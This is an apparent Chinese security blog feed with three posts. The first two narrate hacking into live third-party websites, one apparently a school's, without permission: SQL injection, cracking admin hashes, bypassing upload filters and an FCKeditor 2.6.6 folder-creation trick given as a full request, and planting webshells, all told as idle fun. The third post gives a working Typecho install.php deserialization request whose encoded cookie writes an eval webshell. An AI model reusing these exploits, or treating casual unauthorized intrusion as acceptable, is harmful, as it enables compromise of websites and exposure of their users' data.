src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/27.png" alt="意外性的发现一套cms的注入漏洞"></p><p>Oh Fuck</p><p>试了试另外一个，也是一样的结果…..</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/28.png" alt="意外性的发现一套cms的注入漏洞"></p><p>然后看了看其他网站，可能真的人品爆发，有个站解密成功了</p><p>然后登录之。</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/29.png" alt="意外性的发现一套cms的注入漏洞"></p><p>大概看了看网站后台，在这添加上php</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/30.png" alt="意外性的发现一套cms的注入漏洞"></p><p>找到个上传文件的地方，感觉shell就在眼前</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/31.png" alt="意外性的发现一套cms的注入漏洞"></p><p>点击上传发现…………我真是个命苦的人啊</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/32.png" alt="意外性的发现一套cms的注入漏洞"></p><p>只能拿出我苦练多年的打狗大法…….拿起burp抓包</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/33.png" alt="意外性的发现一套cms的注入漏洞"></p><p>在这里构造畸形的http，然后放包，成功上传。（自带滑稽表情）</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/34.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/35.png" alt="意外性的发现一套cms的注入漏洞"></p><p>点击那个放大镜</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/36.png" alt="意外性的发现一套cms的注入漏洞"></p><p>源码暴露了路径也不对劲…….看来不是他真实路径。</p><p>又翻了翻，发现这个，点击检索</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/37.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/38.png" alt="意外性的发现一套cms的注入漏洞"></p><p>看到刚才上传的文件，点击源文件</p><p>路径变成了，多了个下划线…….</p><p><a href="http://www.xxx.com/data/upload/2017-04/08215611_edit._php">http://www.xxx.com/data/upload/2017-04/08215611_edit._php</a></p><p>这个问题卡了我两天，各种姿势都试了，还是没办法绕过。</p><p>所以放弃了。。。。。</p><p>Ps：这个提供这套cms的站点也存在该漏洞</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/39.png" alt="意外性的发现一套cms的注入漏洞"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>毫无技术含量的一次渗透</title>
    <link href="/p/3dc0c236.html"/>
    <url>/p/3dc0c236.html</url>
    
    <content type="html"><![CDATA[<p>马上就双十一了，发一篇去年双十一写的文章！图片太多，懒得打码了，一年过去了，漏洞没补也不怪我了吧。。。</p><p>事情是这样的，双十一大家都知道，有钱的都在买东西，没钱的都在借钱买东西。像我这种又丑又没钱的只能在聊 QQ……无意间在一个群里看到</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/01.png" alt="毫无技术含量的一次渗透"></p> <a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/02.png" alt="毫无技术含量的一次渗透"></p><p>反正无聊，随手打开看看吧。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/03.png" alt="毫无技术含量的一次渗透"></p><p>看起来是个学校网站啊。说不定有妹子的资料啥的。看到那哥们说有马啥的。我就去打开链接看了看。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/04.png" alt="毫无技术含量的一次渗透"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/05.png" alt="毫无技术含量的一次渗透"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/06.png" alt="毫无技术含量的一次渗透"><br>好好好，你赢了，这都是啥屌东西啊~不过还真找到一个 d.asp 的马</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/07.png" alt="毫无技术含量的一次渗透"><br>先看看这马能不能溢出吧，毕竟别人的 shell 为啥不能占为己有呢</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/08.png" alt="毫无技术含量的一次渗透"><br>………溢出失败，还是别偷懒吧，一步步来。回到首页，随便打开一个链接。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/09.png" alt="毫无技术含量的一次渗透"><br>直觉告诉我，这屌地方有注入啊，加个‘试试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/10.png" alt="毫无技术含量的一次渗透"><br>果然，报错了…..我也不装逼什么的手工注入了。果断丢进啊 d 神器中，毕竟还要去看片（正经片）。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/11.png" alt="毫无技术含量的一次渗透"><br>出来了，丢到 cmd5 去解密看看</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/12.png" alt="毫无技术含量的一次渗透"><br>穷逼买不起….竟然买不起就先找后台吧….找到以后再借钱去买吧…..<br>Admin 404</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/13.png" alt="毫无技术含量的一次渗透"></p><p>Login.asp 也是 404，算了，用御剑扫扫吧。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/14.png" alt="毫无技术含量的一次渗透"><br>看到前 3 条，有 fck 编辑器。那还是从这下手吧，毕竟能省下解密的钱。<br>看了下版本，是 2.6.6 的</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/15.png" alt="毫无技术含量的一次渗透"><br>2.6.6 版本的 fck 的上传页面</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/16.png" alt="毫无技术含量的一次渗透"><br>Ok，先来看看第一个</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/17.png" alt="毫无技术含量的一次渗透"><br>先查看下目录和文件</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/18.png" alt="毫无技术含量的一次渗透"><br>当前目录下什么都没有啊<br>然后随便上传一张图片看下能否上传吧。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/19.png" alt="毫无技术含量的一次渗透"><br>显示上传没有错误，那就是成功了啊！！！查看下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/20.png" alt="毫无技术含量的一次渗透"><br>果然多出了一张图片，看来会自动重命名了，先访问试试</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/21.png" alt="毫无技术含量的一次渗透"><br>可以正常访问的，然后嘛，各种截断都没用</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/22.png" alt="毫无技术含量的一次渗透"><br>去查看服务器信息吧…</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/23.png" alt="毫无技术含量的一次渗透"><br>那就上解析漏洞吧<br>创建一个 ice.asp 的文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/24.png" alt="毫无技术含量的一次渗透"><br>我擦，变下划线了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/25.png" alt="毫无技术含量的一次渗透"><br>淡定，我记得这个是可以突破的….<br>构造下语句</p><p><code>  FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/ice.asp&amp;NewFolderName=x.asp</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/26.png" alt="毫无技术含量的一次渗透"></p><p>成功建立了<br>亮出我们的一句话</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/27.png" alt="毫无技术含量的一次渗透"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/28.png" alt="毫无技术含量的一次渗透"><br>上传成功，查看下文件</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/29.png" alt="毫无技术含量的一次渗透"><br>构造下路径访问</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/30.png" alt="毫无技术含量的一次渗透"><br>来啊，互相伤害啊</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/31.png" alt="毫无技术含量的一次渗透"></p><p>突然想到，这种站怎么可能会有妹子资料，算了算了，提不起兴趣了。删马走人…….<br>此文没有任何技术含量。只是双十一屌丝蛋疼打发时间而已！！勿喷</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typecho install.php 反序列化导致任意代码执行</title>
    <link href="/p/19b8a02a.html"/>
    <url>/p/19b8a02a.html</url>
    
    <content type="html"><![CDATA[<h1 id="什么是Typecho？"><a href="#什么是Typecho？" class="headerlink" title="什么是Typecho？"></a>什么是Typecho？</h1><p>Typecho 是一款博客程序，它在 GPL version 2 许可证下发行，基于 PHP (需要 PHP5 以上版本)构建,可以运行在各种平台上，支持多种数据库(Mysql, PostgreSQL, SQLite)，在国内使用较广。</p><h1 id="影响的版本"><a href="#影响的版本" class="headerlink" title="影响的版本"></a>影响的版本</h1><p>GitHub上2017年10月24日之前的所以版本。</p><a id="more"></a><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /typecho/install.php?finish=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.127</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">12</span>; rv:<span class="hljs-number">55</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">55</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Cookie</span>: __typecho_config=YToyOntzOjc<span class="hljs-number">6</span>ImFkYXB<span class="hljs-number">0</span>ZXIiO<span class="hljs-number">086</span>MTI<span class="hljs-number">6</span>IlR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZCI<span class="hljs-number">6</span>NDp<span class="hljs-number">7</span>czoxOToiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfdHlwZSI<span class="hljs-number">7</span>czo<span class="hljs-number">4</span>OiJBVE<span class="hljs-number">9</span>NIDEuMCI<span class="hljs-number">7</span>czoyMjoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfY<span class="hljs-number">2</span>hhcnNldCI<span class="hljs-number">7</span>czo<span class="hljs-number">1</span>OiJVVEYtOCI<span class="hljs-number">7</span>czoxOToiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfbGFuZyI<span class="hljs-number">7</span>czoyOiJ<span class="hljs-number">6</span>aCI<span class="hljs-number">7</span>czoyMDoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfaXRlbXMiO<span class="hljs-number">2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>aTowO<span class="hljs-number">2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>czo<span class="hljs-number">2</span>OiJhdXRob<span class="hljs-number">3</span>IiO<span class="hljs-number">086</span>MTU<span class="hljs-number">6</span>IlR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fUmVxdWVzdCI<span class="hljs-number">6</span>Mjp<span class="hljs-number">7</span>czoyNDoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fUmVxdWVzdABfcGFyYW<span class="hljs-number">1</span>zIjthOjE<span class="hljs-number">6</span>e<span class="hljs-number">3</span>M<span class="hljs-number">6</span>MTA<span class="hljs-number">6</span>InNjcmVlbk<span class="hljs-number">5</span>hbWUiO<span class="hljs-number">3</span>M<span class="hljs-number">6</span>NTc<span class="hljs-number">6</span>ImZpbGVfcHV<span class="hljs-number">0</span>X<span class="hljs-number">2</span>NvbnRlbnRzKCdwMC<span class="hljs-number">5</span>waHAnLCAnPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUW<span class="hljs-number">3</span>AwXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>nKSI<span class="hljs-number">7</span>fXM<span class="hljs-number">6</span>MjQ<span class="hljs-number">6</span>IgBUeXBlY<span class="hljs-number">2</span>hvX<span class="hljs-number">1</span>JlcXVlc<span class="hljs-number">3</span>QAX<span class="hljs-number">2</span>ZpbHRlciI<span class="hljs-number">7</span>YToxOntpOjA<span class="hljs-number">7</span>czo<span class="hljs-number">2</span>OiJhc<span class="hljs-number">3</span>NlcnQiO<span class="hljs-number">319</span>fX<span class="hljs-number">19</span>czo<span class="hljs-number">2</span>OiJwcmVmaXgiO<span class="hljs-number">3</span>M<span class="hljs-number">6</span>NzoidHlwZWNobyI<span class="hljs-number">7</span>fQ==<span class="hljs-attribute">Referer</span>:http://<span class="hljs-number">192.168.0.127</span>/typecho/install.php<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们先去typecho官网下载套源码在本地搭建个环境</p><p>搭建过程就不多说了，自己百度</p><p>搭建好后我们访问首页看看</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171024_Typecho_install.php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/01.png" alt="Typecho install.php 反序列化导致任意代码执行"></p><p>接下来我们打开burp设置好代理，访问<a href="http://192.168.0.127/typecho/install.php?finish=1">http://192.168.0.127/typecho/install.php?finish=1</a> （将ip换成自己的ip），然后把包拦截，将http协议修改成我们的payload。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171024_Typecho_install.php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/02.png" alt="Typecho install.php 反序列化导致任意代码执行"></p><p>然后放包，网站根目录下就生成了一句话马。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171024_Typecho_install.php_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/03.png" alt="Typecho install.php 反序列化导致任意代码执行"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Typecho</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>陪妹子玩游戏引起的风波</title>
    <link href="/p/6c69f06.html"/>
    <url>/p/6c69f06.html</url>
    
